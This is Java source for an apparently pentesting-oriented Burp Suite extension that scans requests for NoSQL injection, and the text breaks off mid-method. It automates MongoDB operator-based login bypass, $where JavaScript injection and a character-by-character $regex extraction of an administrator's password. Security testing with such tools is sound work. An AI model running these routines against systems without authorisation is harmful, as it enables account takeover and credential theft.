package nosqli;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;

import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * NoSQLiContextMenu — Right-click menu
 *
 * Locking model (v2.1.1): every menu entry point takes the per-host scan
 * lock via beginScoped() and releases it in a finally — cancel paths
 * included, so a cancelled host is immediately scannable again. Full Scan
 * takes the lock ONCE and drives the unlocked doX techniques with its own
 * ScanState.Handle; a nested tryBegin can never reject a sub-scan (that
 * used to make Full Scan a no-op), and cancelling it stops the remaining
 * techniques for good (cancellation is an epoch, never cleared by end()).
 */
public class NoSQLiContextMenu implements ContextMenuItemsProvider {

    private final MontoyaApi api;
    private final FindingsLogger flog;
    private final ExecutorService executor;

    private static final long REQUEST_DELAY_MS = 150;

    /** Extra pause engaged by rate-limit/blocking signals; decays on success. */
    private final java.util.concurrent.atomic.AtomicLong backoffMs = new java.util.concurrent.atomic.AtomicLong();

    public NoSQLiContextMenu(MontoyaApi api) {
        this.api      = api;
        this.flog     = FindingsLogger.getInstance();
        this.executor = Executors.newFixedThreadPool(4);
    }

    /** Extension unload: cancel in-flight scans and stop the worker pool. */
    public void shutdown() {
        ScanState.cancel();
        executor.shutdownNow();
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> items = new ArrayList<>();

        List<HttpRequestResponse> selectedRRs = event.messageEditorRequestResponse()
            .map(msgEditor -> List.of(msgEditor.requestResponse()))
            .orElseGet(() -> event.selectedRequestResponses());

        if (selectedRRs == null || selectedRRs.isEmpty()) return items;
        HttpRequestResponse selectedRR = selectedRRs.get(0);

        JMenu mainMenu = new JMenu("NoSQLi Hunter");

        SmartBodyDetector.BodyType bodyType = SmartBodyDetector.detect(selectedRR.request());
        JMenuItem bodyTypeInfo = new JMenuItem("Body Type: " + bodyType.name());
        bodyTypeInfo.setEnabled(false);
        mainMenu.add(bodyTypeInfo);
        mainMenu.addSeparator();

        // Auth Bypass
        JMenu authMenu = new JMenu("Authentication Bypass");
        JMenuItem authUrl = new JMenuItem("URL-Encoded ($ne, $gt, $regex, $nin, $in, $exists)");
        authUrl.addActionListener(e -> executor.submit(() -> runAuthBypass(selectedRR, SmartBodyDetector.BodyType.URL_ENCODED)));
        JMenuItem authJson = new JMenuItem("JSON Operator Bypass");
        authJson.addActionListener(e -> executor.submit(() -> runAuthBypass(selectedRR, SmartBodyDetector.BodyType.JSON)));
        authMenu.add(authUrl);
        authMenu.add(authJson);
        mainMenu.add(authMenu);

        // Operator Scan
        JMenuItem operatorScan = new JMenuItem("Operator Injection Scan");
        operatorScan.addActionListener(e -> executor.submit(() -> runOperatorScan(selectedRR)));
        mainMenu.add(operatorScan);

        // JS Injection
        JMenuItem jsScan = new JMenuItem("JavaScript Injection ($where)");
        jsScan.addActionListener(e -> executor.submit(() -> runJsScan(selectedRR)));
        mainMenu.add(jsScan);

        // Data Extraction (opt-in, request-heavy)
        JMenuItem extractScan = new JMenuItem("Extract Field Data ($regex, opt-in)");
        extractScan.addActionListener(e -> executor.submit(() -> runRegexExtract(selectedRR)));
        mainMenu.add(extractScan);

        // Time-Based
        JMenuItem timeScan = new JMenuItem("Time-Based Blind (3s delay)");
        timeScan.addActionListener(e -> executor.submit(() -> runTimeScan(selectedRR)));
        mainMenu.add(timeScan);

        // Content-Type Confusion
        JMenuItem ctConfusion = new JMenuItem("Content-Type Confusion (→ JSON ops)");
        ctConfusion.addActionListener(e -> executor.submit(() -> runContentTypeConfusion(selectedRR)));
        mainMenu.add(ctConfusion);

        // Aggregation Pipeline
        JMenuItem aggScan = new JMenuItem("Aggregation Pipeline Injection");
        aggScan.addActionListener(e -> executor.submit(() -> runAggregationScan(selectedRR)));
        mainMenu.add(aggScan);

        // Mongoose CVE
        JMenuItem mongoose = new JMenuItem("Mongoose CVE-2025-23061 ($where via $or)");
        mongoose.addActionListener(e -> executor.submit(() -> runMongooseBypass(selectedRR)));
        mainMenu.add(mongoose);

        mainMenu.addSeparator();

        // Full Scan
        JMenuItem fullScan = new JMenuItem("Full NoSQL Injection Scan (All Techniques)");
        fullScan.addActionListener(e -> executor.submit(() -> runFullScan(selectedRR)));
        mainMenu.add(fullScan);

        items.add(mainMenu);
        return items;
    }

    // ─────────────────────────────────────────────────────────────
    // SCAN LIFECYCLE
    // ─────────────────────────────────────────────────────────────

    /** Take the per-host scan lock, logging the standard busy message on refusal. */
    private ScanState.Handle beginScoped(String label, HttpRequestResponse baseRR) {
        String host = hostOf(baseRR.request().url());
        ScanState.Handle scan = ScanState.tryBegin(host);
        if (scan == null) {
            flog.log("[" + label + "] A scan is already running against " + host +
                " — cancel it from the NoSQLi Hunter tab first.");
        }
        return scan;
    }

    /** True if the user requested cancellation; logs the stop and returns once. */
    private boolean cancelRequested(ScanState.Handle scan, String label) {
        if (!scan.cancelled()) return false;
        flog.log("[" + label + "] Cancelled by user — stopping this scan.");
        return true;
    }

    // ─────────────────────────────────────────────────────────────
    // AUTH BYPASS
    // ─────────────────────────────────────────────────────────────

    private int runAuthBypass(HttpRequestResponse baseRR, SmartBodyDetector.BodyType forceType) {
        flog.log("\n[AUTH BYPASS] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("AUTH BYPASS", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doAuthBypass(baseRR, forceType, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[AUTH BYPASS] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("Authentication Bypass", baseRR.request().url(), findings);
        return findings;
    }

    private int doAuthBypass(HttpRequestResponse baseRR, SmartBodyDetector.BodyType forceType,
                             ScanState.Handle scan) {
        int findings = 0;

        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());
        if (params.isEmpty()) {
            flog.log("[AUTH BYPASS] No parameters found.");
            return 0;
        }

        String userField = guessField(params, "user","username","email","login","name","uname","uid");
        // No "token"/"key" here on purpose: a CSRF-token field must never be
        // picked as the password field — the scan would destroy the token
        // instead of testing the credential.
        String passField = guessField(params, "pass","password","pwd","secret","passwd");
        // Positional fallbacks must respect the same rule: pick the first
        // NON-token field, never blindly params.get(1) (which is a csrf
        // field on plenty of real forms).
        if (userField == null) {
            for (SmartBodyDetector.ParsedParam p : params)
                if (!tokenish(p.name)) { userField = p.name; break; }
            if (userField == null) userField = params.get(0).name;
        }
        if (passField == null) {
            for (SmartBodyDetector.ParsedParam p : params)
                if (!p.name.equals(userField) && !tokenish(p.name)) { passField = p.name; break; }
            if (passField == null) passField = "password"; // absent → user-field-only testing
        }

        flog.log("[AUTH BYPASS] Targeting fields: user=" + userField + ", pass=" + passField);

        List<PayloadDatabase.AuthBypassPair> payloads =
            forceType == SmartBodyDetector.BodyType.JSON
            ? PayloadDatabase.getAuthBypassJsonParts()
            : PayloadDatabase.getAuthBypassUrlEncodedParts();

        // Baseline
        HttpRequestResponse baseline = send(baseRR.request());
        int    baselineStatus  = baseline.response() != null ? baseline.response().statusCode() : 0;
        String baselineBody    = baseline.response() != null ? baseline.response().bodyToString() : "";
        String baselinePath    = extractPath(baseline.response() != null
            ? baseline.response().headerValue("Location") : null);

        // If the captured request is itself a VALID login (e.g. the user grabbed
        // their own logged-in request), the baseline is already authenticated:
        // every FAILED payload then looks like a "change" and gets reported as a
        // bypass, while a real bypass looks identical to baseline. Re-baseline
        // with a deliberately wrong password so the starting state is a known
        // failure.
        boolean baselineAuthed =
            (isAuthSuccessPath(baselinePath) ||
             containsAny(baselineBody, PayloadDatabase.AUTH_SUCCESS_KEYWORDS))
            && !containsAny(baselineBody, PayloadDatabase.AUTH_FAILURE_KEYWORDS);

        SmartBodyDetector.ParsedParam userParam = null;
        SmartBodyDetector.ParsedParam passParam = null;
        for (SmartBodyDetector.ParsedParam p : params) {
            if (userParam == null && p.name.equals(userField)) userParam = p;
            if (passParam == null && p.name.equals(passField)) passParam = p;
        }

        if (passParam == null) {
            flog.log("[AUTH BYPASS] Password field '" + passField +
                "' not present — testing the user field only.");
        }

        if (baselineAuthed && passParam != null) {
            flog.log("[AUTH BYPASS] Baseline looks already logged-in (status=" + baselineStatus +
                     ") — re-baselining with a wrong password");
            // JSON bodies need the replacement value pre-quoted; urlencoded/GET
            // take the bare string.
            String wrongPw =
                (passParam.bodyType == SmartBodyDetector.BodyType.JSON ||
                 passParam.bodyType == SmartBodyDetector.BodyType.GRAPHQL)
                ? "\"nosqli_wrong_password\""
                : "nosqli_wrong_password";

            baseline = send(
                SmartBodyDetector.applyPayload(baseRR.request(), passParam, wrongPw));
            baselineStatus = baseline.response() != null ? baseline.response().statusCode() : 0;
            baselineBody   = baseline.response() != null ? baseline.response().bodyToString() : "";
            baselinePath   = extractPath(baseline.response() != null
                ? baseline.response().headerValue("Location") : null);
            flog.log("[AUTH BYPASS] Failure baseline: status=" + baselineStatus);
        }

        boolean errorLeadReported = false;

        for (int pi = 0; pi < payloads.size(); pi++) {
            if (cancelRequested(scan, "AUTH BYPASS")) return findings;
            PayloadDatabase.AuthBypassPair pair = payloads.get(pi);
            flog.log("[AUTH BYPASS] Attempt " + (pi + 1) + "/" + payloads.size() + ": " + pair.description);
            throttle();

            // Rewrite ONLY the auth fields; every other field of the original
            // body (CSRF tokens, session hints, extra parameters) survives.
            HttpRequest modified = buildAuthBypassRequest(baseRR, forceType, pair,
                userParam, passParam, userField, passField, params);

            String payload = forceType == SmartBodyDetector.BodyType.JSON
                ? "{\"" + userField + "\": " + pair.userPart + ", \"" + passField + "\": " + pair.passPart + "}"
                : userField + pair.userPart + "&" + passField + pair.passPart;

            HttpRequestResponse rr = send(modified);
            if (rr.response() == null) continue;

            int    status     = rr.response().statusCode();
            String body       = rr.response().bodyToString();
            String location   = rr.response().headerValue("Location");
            String pathAfter  = extractPath(location);

            // ── Detection Logic ───────────────────────────────────────
            boolean statusChanged   = (status != baselineStatus);

            // A status change alone is bypass evidence only when the payload
            // response is success-class AND its body carries no failure text:
            // most HTML login flows return 200 with "Invalid username or
            // password" on failure, so a bare 2xx means nothing.
            boolean statusBypass    = statusChanged && status >= 200 && status < 300
                                   && !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS);

            // Content-based: success keywords appeared OR failure keywords disappeared
            boolean successAppeared = containsAny(body, PayloadDatabase.AUTH_SUCCESS_KEYWORDS)
                                   && !containsAny(baselineBody, PayloadDatabase.AUTH_SUCCESS_KEYWORDS);
            boolean failureGone     = !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS)
                                   && containsAny(baselineBody, PayloadDatabase.AUTH_FAILURE_KEYWORDS);

            // URL path change: redirect to dashboard/profile = login success.
            // The new path must look like a success destination AND the body
            // must not carry failure text — redirects to error pages used to
            // count (paths like /user-not-found contain "user").
            boolean pathChanged     = !safeEquals(pathAfter, baselinePath)
                                   && isAuthSuccessPath(pathAfter)
                                   && !containsAny(body, PayloadDatabase.AUTH_FAILURE_KEYWORDS);

            // A real bypass always answers with a normal status (200/302).
            // 4xx/5xx are errors, never bypasses: an operator payload that
            // crashes the query (e.g. it matched several records) proves the
            // operator reached the query, but nobody got authenticated.
            //
            // Two tiers of evidence: STRONG = something positive appeared
            // (success text, success-looking redirect, 2xx status change).
            // WEAK = the failure text merely disappeared — validation
            // middleware words its rejections differently from the login
            // error all the time ("Bad request"), so absence of known
            // failure words alone is only a lead, never a CRITICAL.
            boolean strongBypass = status < 400 &&
                (statusBypass || successAppeared || pathChanged);
            boolean weakBypass = !strongBypass && status < 400 && failureGone;

            // Error-based lead: a healthy target that 4xx/5xxes on operator
            // payloads is telling us the operators reached the query. That is
            // a thread to pull, not a bypass — report it ONCE per scan as a
            // MEDIUM finding with the visible error text as evidence.
            boolean errorLead = !strongBypass && !weakBypass && baselineStatus < 400 && status >= 400 &&
                (status >= 500 || containsAny(body, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT));

            if (errorLead && !errorLeadReported) {
                errorLeadReported = true;
                flog.log("[AUTH BYPASS]   Error " + status + " on operator payload — operators likely " +
                    "reached the query. Reported as MEDIUM lead: " + truncate(payload, 60));
                flog.reportFinding(new FindingsLogger.Finding(
                    "OPERATOR-ERROR", "MEDIUM",
                    baseRR.request().url(),
                    userField + "+" + passField,
                    payload,
                    modified.toString(),
                    "Server error " + status + " on operator payload (baseline " + baselineStatus +
                        "). Follow up with narrower payloads. Error text: " + snippet(body),
                    null
                ));
            } else if (!strongBypass && !weakBypass && status >= 500) {
                flog.log("[AUTH BYPASS]   Server error (" + status + ") on operator payload — " +
                    "interesting, NOT a bypass (lead already reported): " + truncate(payload, 60));
            }

            String evidence = String.format(
                "status=%d (was %d) | path=%s (was %s) | content=%s",
                status, baselineStatus,
                pathAfter.isEmpty() ? "none" : pathAfter,
                baselinePath.isEmpty() ? "none" : baselinePath,
                successAppeared ? "SUCCESS keywords appeared" :
                    failureGone ? "FAILURE keywords disappeared" : "no change"
            );

            flog.log("[AUTH BYPASS] " + (strongBypass ? " BYPASS!" :
                    weakBypass ? " LEAD (failure text gone)" : " No bypass") +
                " | " + evidence + " | payload=" + truncate(payload, 60));

            if (strongBypass) {
                findings++;
                flog.reportFinding(new FindingsLogger.Finding(
                    "AUTH-BYPASS", "CRITICAL",
                    baseRR.request().url(),
                    userField + "+" + passField,
                    payload,
                    modified.toString(),   // ← full HTTP request كامل
                    evidence,
                    pathAfter
                ));
                api.siteMap().add(rr);
            } else if (weakBypass) {
                findings++;
                flog.reportFinding(new FindingsLogger.Finding(
                    "AUTH-BYPASS-LEAD", "MEDIUM",
                    baseRR.request().url(),
                    userField + "+" + passField,
                    payload,
                    modified.toString(),
                    evidence + " | failure text disappeared with NO positive success evidence — " +
                        "often just different validation wording; verify manually in Repeater",
                    pathAfter
                ));
            }
        }
        return findings;
    }

    // ─────────────────────────────────────────────────────────────
    // OPERATOR SCAN
    // ─────────────────────────────────────────────────────────────

    private int runOperatorScan(HttpRequestResponse baseRR) {
        flog.log("\n[OPERATOR SCAN] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("OPERATOR SCAN", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doOperatorScan(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[OPERATOR SCAN] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("Operator Injection Scan", baseRR.request().url(), findings);
        return findings;
    }

    private int doOperatorScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
        int findings = 0;

        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());
        if (params.isEmpty()) {
            flog.log("[OPERATOR SCAN] No injectable parameters found.");
            return 0;
        }

        HttpRequestResponse baseline = send(baseRR.request());
        int    baselineLen    = baseline.response() != null ? baseline.response().body().length() : 0;
        int    baselineStatus = baseline.response() != null ? baseline.response().statusCode() : 0;
        String baselineBody   = baseline.response() != null ? baseline.response().bodyToString() : "";
        String baselinePath   = extractPath(baseline.response() != null
            ? baseline.response().headerValue("Location") : null);

        for (SmartBodyDetector.ParsedParam param : params) {
            if (cancelRequested(scan, "OPERATOR SCAN")) return findings;
            flog.log("[OPERATOR SCAN] Testing parameter: " + param.name);

            List<PayloadDatabase.BooleanPair> pairs;
            if (param.bodyType == SmartBodyDetector.BodyType.JSON ||
                param.bodyType == SmartBodyDetector.BodyType.GRAPHQL) {
                pairs = PayloadDatabase.getJsonBooleanPairs();
            } else if (param.bodyType == SmartBodyDetector.BodyType.URL_ENCODED ||
                       param.bodyType == SmartBodyDetector.BodyType.GET_PARAMS) {
                pairs = PayloadDatabase.getUrlEncodedBooleanPairs(param.name);
            } else {
                flog.log("[OPERATOR SCAN] Skipping parameter: " + param.name +
                    " (operator injection not applicable to " + param.bodyType + " bodies)");
                continue;
            }

            int hits = 0;
            String bestPayload = null;
            HttpRequest bestReq = null;
            String bestEvidence = null;

            for (PayloadDatabase.BooleanPair pair : pairs) {
                if (cancelRequested(scan, "OPERATOR SCAN")) return findings;
                throttle();
                HttpRequest trueReq  = SmartBodyDetector.applyOperatorPayload(baseRR.request(), param, pair.truePayload);
                HttpRequest falseReq = SmartBodyDetector.applyOperatorPayload(baseRR.request(), param, pair.falsePayload);

                HttpRequestResponse trueRR  = send(trueReq);
                HttpRequestResponse falseRR = send(falseReq);
                if (trueRR.response() == null || falseRR.response() == null) continue;

                // A WAF/rate-limit page on either side makes this pair noise.
                if (isBlockStatus(trueRR.response().statusCode())
                        || isBlockStatus(falseRR.response().statusCode())) {
                    flog.log("[OPERATOR SCAN]   " + param.name + " | " + pair.description
                        + " | blocked response (WAF/rate-limit) — skipped");
                    continue;
                }

                int trueStatus  = trueRR.response().statusCode();
                int falseStatus = falseRR.response().statusCode();
                String truePath  = extractPath(trueRR.response().headerValue("Location"));
                String falsePath = extractPath(falseRR.response().headerValue("Location"));

                // Compare normalized bodies: strip the reflected payload
                // (pair AND bare value) and dynamic per-response content so
                // only real behavior differs.
                String normTrue  = DiffEngine.normalize(trueRR.response().bodyToString(),
                    pair.truePayload, DiffEngine.valuePartOf(pair.truePayload));
                String normFalse = DiffEngine.normalize(falseRR.response().bodyToString(),
                    pair.falsePayload, DiffEngine.valuePartOf(pair.falsePayload));

                DiffEngine.Signals sig = DiffEngine.evaluate(
                    trueStatus != falseStatus,
                    normTrue.length(), normFalse.length(),
                    normTrue, normFalse, truePath, falsePath);

                String evidence = String.format(
                    "TRUE: %db/%d%s | FALSE: %db/%d%s",
                    normTrue.length(), trueStatus, truePath.isEmpty() ? "" : " → " + truePath,
                    normFalse.length(), falseStatus, falsePath.isEmpty() ? "" : " → " + falsePath
                );

                flog.log("[OPERATOR SCAN]   " + param.name + " | " + pair.description +
                    " | " + evidence + " | " + (sig.any() ? "DIFFERENT (" + sig.describe() + ")" : "Same"));

                if (sig.any()) {
                    // Stability check: a real differential reproduces on resend.
                    throttle();
                    HttpRequestResponse trueRR2  = send(trueReq);
                    HttpRequestResponse falseRR2 = send(falseReq);
                    boolean stable = false;
                    if (trueRR2.response() != null && falseRR2.response() != null) {
                        String t2 = DiffEngine.normalize(trueRR2.response().bodyToString(),
                            pair.truePayload, DiffEngine.valuePartOf(pair.truePayload));
                        String f2 = DiffEngine.normalize(falseRR2.response().bodyToString(),
                            pair.falsePayload, DiffEngine.valuePartOf(pair.falsePayload));
                        DiffEngine.Signals sig2 = DiffEngine.evaluate(
                            trueRR2.response().statusCode() != falseRR2.response().statusCode(),
                            t2.length(), f2.length(), t2, f2,
                            extractPath(trueRR2.response().headerValue("Location")),
                            extractPath(falseRR2.response().headerValue("Location")));
                        stable = sig2.any();
                    }
                    if (!stable) {
                        flog.log("[OPERATOR SCAN]   " + param.name + " | " + pair.description +
                            " | diff not reproducible — skipped");
                        continue;
                    }
                    hits++;
                    api.siteMap().add(trueRR);
                    if (bestPayload == null) {
                        bestPayload = pair.truePayload;
                        bestReq = trueReq;
                        bestEvidence = evidence;
                    }
                }
            }

            if (hits >= 2) {
                findings++;
                flog.log("[OPERATOR SCAN]  CONFIRMED injectable: " + param.name);
                flog.reportFinding(new FindingsLogger.Finding(
                    "OPERATOR-INJECTION", "HIGH",
                    baseRR.request().url(),
                    param.name,
                    bestPayload,
                    bestReq != null ? bestReq.toString() : "",
                    bestEvidence + " | " + hits + " pairs confirmed",
                    null
                ));
            }
        }
        return findings;
    }

    // ─────────────────────────────────────────────────────────────
    // JS INJECTION
    // ─────────────────────────────────────────────────────────────

    private int runJsScan(HttpRequestResponse baseRR) {
        flog.log("\n[JS INJECTION] Starting → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("JS INJECTION", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doJsScan(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[JS INJECTION] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("JavaScript Injection", baseRR.request().url(), findings);
        return findings;
    }

    private int doJsScan(HttpRequestResponse baseRR, ScanState.Handle scan) {
        int findings = 0;

        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());
        HttpRequestResponse baseline = send(baseRR.request());
        String baselineBody = baseline.response() != null ? baseline.response().bodyToString() : "";
        String baselinePath = extractPath(baseline.response() != null
            ? baseline.response().headerValue("Location") : null);
        List<PayloadDatabase.JsPair> jsPairs = PayloadDatabase.getJsInjectionPairs();

        for (SmartBodyDetector.ParsedParam param : params) {
            if (cancelRequested(scan, "JS INJECTION")) return findings;
            flog.log("[JS INJECTION] Testing parameter: " + param.name);

            for (PayloadDatabase.JsPair pair : jsPairs) {
                if (cancelRequested(scan, "JS INJECTION")) return findings;
                throttle();
                HttpRequest trueReq  = SmartBodyDetector.applyPayload(baseRR.request(), param, pair.truePayload);
                HttpRequest falseReq = SmartBodyDetector.applyPayload(baseRR.request(), param, pair.falsePayload);

                HttpRequestResponse trueRR  = send(trueReq);
                HttpRequestResponse falseRR = send(falseReq);
                if (trueRR.response() == null || falseRR.response() == null) continue;

                // A WAF/rate-limit page on either side makes this pair noise.
                if (isBlockStatus(trueRR.response().statusCode())
                        || isBlockStatus(falseRR.response().statusCode())) {
                    flog.log("[JS INJECTION]   " + param.name + " | " + pair.description
                        + " | blocked response (WAF/rate-limit) — skipped");
                    continue;
                }

                String trueBody = trueRR.response().bodyToString();
                String truePath = extractPath(trueRR.response().headerValue("Location"));
                String falsePath = extractPath(falseRR.response().headerValue("Location"));

                // Normalized comparison, same rules as the operator scan: a
                // reflected payload or per-request token must never count.
                String normTrue  = DiffEngine.normalize(trueBody, pair.truePayload);
                String normFalse = DiffEngine.normalize(falseRR.response().bodyToString(), pair.falsePayload);

                boolean hasError   = containsAny(trueBody, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT)
                                  && !containsAny(baselineBody, PayloadDatabase.MONGODB_ERROR_SIGNATURES_STRICT);
                boolean sizeDiff   = isSignificantDiff(normTrue.length(), normFalse.length());
                boolean statusDiff = trueRR.response().statusCode() != falseRR.response().statusCode();
                boolean pathDiff   = !safeEquals(truePath, falsePath);
                boolean keywordDiff = DiffEngine.keywordFlip(normTrue, normFalse);

                boolean found = sizeDiff || statusDiff || pathDiff || keywordDiff || hasError;

                String evidence = String.format(
                    "true=%db false=%db status=%d/%d path=%s%s",
                    normTrue.length(), normFalse.length(),
                    trueRR.response().statusCode(),
                    falseRR.response().statusCode(),
                    truePath.isEmpty() ? "none" : truePath,
                    hasError ? " [DB ERROR]" : ""
                );

                flog.log("[JS INJECTION] " + (found ? "  " : "   ") +
                    pair.description + " | param=" + param.name + " | " + evidence);

                if (found) {
                    // Stability check: a real differential reproduces on resend.
                    throttle();
                    HttpRequestResponse trueRR2  = send(trueReq);
                    HttpRequestResponse falseRR2 = send(falseReq);
                    boolean stable = false;
                    if (trueRR2.response() != null && falseRR2.response() != null) {
                        String t2 = DiffEngine.normalize(trueRR2.response().bodyToString(), pair.truePayload);
                        String f2 = DiffEngine.normalize(falseRR2.response().bodyToString(), pair.falsePayload);
                        stable = DiffEngine.evaluate(
                            trueRR2.response().statusCode() != falseRR2.response().statusCode(),
                            t2.length(), f2.length(), t2, f2,
                            extractPath(trueRR2.response().headerValue("Location")),
                            extractPath(falseRR2.response().headerValue("Location"))).any();
                    }
                    if (!stable) {
                        flog.log("[JS INJECTION]   " + param.name + " | " + pair.description +
                            " | diff not reproducible — skipped");
                        continue;
                    }

                    findings++;
                    flog.reportFinding(new FindingsLogger.Finding(
                        "JS-INJECTION", "HIGH",
                        baseRR.request().url(),
                        param.name,
                        pair.truePayload,
                        trueReq.toString(),   // ← full request
                        evidence + " | reproducible",
                        truePath
                    ));
                    api.siteMap().add(trueRR);
                    // One finding per parameter: the findings-table dedup key
                    // (technique|param|url) would swallow the remaining pairs
                    // anyway, so don't waste their requests.
                    break;
                }
            }
        }
        return findings;
    }

    // ─────────────────────────────────────────────────────────────
    // DATA EXTRACTION ($regex prefix search, opt-in)
    // ─────────────────────────────────────────────────────────────

    /** Characters tried per position, roughly by likelihood. Quotes,
     *  backslash, backtick and space are last (rare in credentials, but a
     *  password containing one must not extract as a truncated "DONE"). */
    private static final String EXTRACT_CHARSET =
        "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        + "!@#$%^&*()_-+=[]{};:,.<>?/|~'\"\\` ";

    /**
     * Extract a field's value character-by-character via $regex prefix
     * search, using the login success/failure difference as the oracle.
     * Opt-in because it sends one request per candidate character.
     * Target username is "administrator" (the common high-value account).
     */
    private int runRegexExtract(HttpRequestResponse baseRR) {
        flog.log("\n[EXTRACT] Starting $regex extraction → " + baseRR.request().url());
        ScanState.Handle scan = beginScoped("EXTRACT", baseRR);
        if (scan == null) return 0;
        int findings;
        try {
            findings = doRegexExtract(baseRR, scan);
        } finally {
            ScanState.end(scan);
            flog.log("[EXTRACT] " + (scan.cancelled() ? "Cancelled." : "Completed."));
        }
        if (findings > 0) showScanSummary("$regex Data Extraction", baseRR.request().url(), findings);
        return findings;
    }

    private int doRegexExtract(HttpRequestResponse baseRR, ScanState.Handle scan) {
        List<SmartBodyDetector.ParsedParam> params = SmartBodyDetector.extractParams(baseRR.request());
        String userField = guessField(params, "user","username","email","login","name","uname","uid");
        String passField = guessField(params, "pass","password","pwd","secret","passwd");
        if (userField == null || passField == null) {
            flog.log("[EXTRACT] Could not identify user/password fields.");
            return 0;
        }
        SmartBodyDetector.ParsedParam userParam = null;
        SmartBodyDetector.ParsedParam passParam = null;
        for (SmartBodyDetector.ParsedParam p : params) {
            if (userParam == null && p.name.equals(userField)) userParam = p;
            if (passParam == null && p.name.equals(passField)) passParam = p;
        }
        if (userParam == null || passParam == null) {
            flog.log("[EXTRACT] User/password fields are not present in the request body.");
            return 0;
        }
        boolean json = userParam.bodyType == SmartBodyDetector.BodyType.JSON
                    || userParam.bodyType == SmartBodyDetector.BodyType.GRAPHQL;

        // Operator parts differ per format: JSON replaces the field VALUE
        // with an object; urlencoded rewrites the field NAME with an operator
        // suffix ("password[$regex]=^a.*"). Building JSON parts for a
        // urlencoded body used to yield "username{\"$regex\": ...}" — no '=',
        // so the request went out unmodified and extraction never worked.
        String targetUser = "administrator";
        String userPart = json
            ? "{\"$regex\": " + jsonStr("^" + targetUser + ".*") + "}"
            : "[$regex]=^" + targetUser + ".*";

        // ── Establish the success/failure oracle ──
        HttpRequestResponse successRR = send(buildExtractRequest(baseRR, json, params,
            userParam, passParam, userField, passField, userPart, passNePart(json)));
        int successStatus = successRR.response() != null ? successRR.response().statusCode() : -1;

        HttpRequestResponse failRR = send(buildExtractRequest(baseRR, json, params,
            userParam, passParam, userField, passField, userPart,
            passRegexPart(json, "NOSQLI_NO_MATCH_ZZ")));
        int failStatus = failRR.response() != null ? failRR.response().statusCode() : -1;

        if (successStatus == -1 || successStatus == failStatus || successStatus >= 400) {
            flog.log("[EXTRACT] Could not establish a success/failure oracle (success="
                + successStatus + ", fail=" + failStatus + "). The target may not be vulnerable, "
                + "or no user matching '" + targetUser + "' exists.");
            return 0;
        }
        flog.log("[EXTRACT] Oracle established: success=" + successStatus + ", fail=" + failStatus
            + ". Extracting " + passField + " for '" + targetUser + "' (cancellable from the tab)...");

        // ── Prefix search, one character at a time ──
        String known = "";
        StringBuilder extracted = new StringBuilder();
        HttpRequest lastMatch = null;
        for (int pos = 0; pos < 64; pos++) {
            if (cancelRequested(scan, "EXTRACT")) return 0;
            boolean matched = false;
            for (int ci = 0; ci < EXTRACT_CHARSET.length(); ci++) {
                char c = EXTRACT_CHARSET.charAt(ci);
                if (cancelRequested(scan, "EXTRACT")) return 0;
                throttle();
                String passPart = passRegexPart(json, regexEscape(known + c));
                HttpRequest req = buildExtractRequest(baseRR, json, params,
                    userParam, passParam, userField, passField, userPart, passPart);
                HttpRequestResponse rr = send(req);
                if (rr.response() == null) continue;
                int st = rr.response().statusCode();
                // An answer that is NEITHER oracle status means the oracle
                // broke mid-run (WAF / rate limit / lockout). Reporting the
                // partial prefix as the password would be a lie — abort.
                if (st != successStatus && st != failStatus) {
                    flog.log("[EXTRACT] Unexpected status " + st +
                        " (WAF/rate-limit?) — aborting WITHOUT reporting a value. Partial: " + extracted);
                    return 0;
                }
                if (st == successStatus) {
                    known = known + c;
                    extracted.append(c);
                    lastMatch = req;
                    flog.log("[EXTRACT] Progress: " + extracted);
                    matched = true;
                    break;
                }
            }
            if (!matched) break; // no candidate matched → end of value
        }

        if (extracted.length() == 0) {
            flog.log("[EXTRACT] Nothing extracted.");
            return 0;
        }
        flog.log("[EXTRACT] DONE: " + passField + " = " + extracted);
        flog.reportFinding(new FindingsLogger.Finding(
            "DATA-EXTRACT", "HIGH",
            baseRR.request().url(),
            userField + "+" + passField,
            "$regex prefix search (" + passField + " of '" + targetUser + "')",
            lastMatch != null ? lastMatch.toString() : "",
            "Extracted value: " + extracted + " | oracle: success=" + successStatus
                + " vs fail=" + failStatus,
            null
        ));
        return 1;
    }

    /** $ne-empty part for the password field (matches whenever a record exists). */
    private static String passNePart(boolean json) {
        return json ? "{\"$ne\": \"\"}" : "[$ne]=";
    }

    /** $regex prefix-search part for the password field, in the body's format. */
    private static String passRegexPart(boolean json, String escapedPrefix) {
        return json
            ? "{\"$regex\": " + jsonStr("^" + escapedPrefix + ".*") + "}"
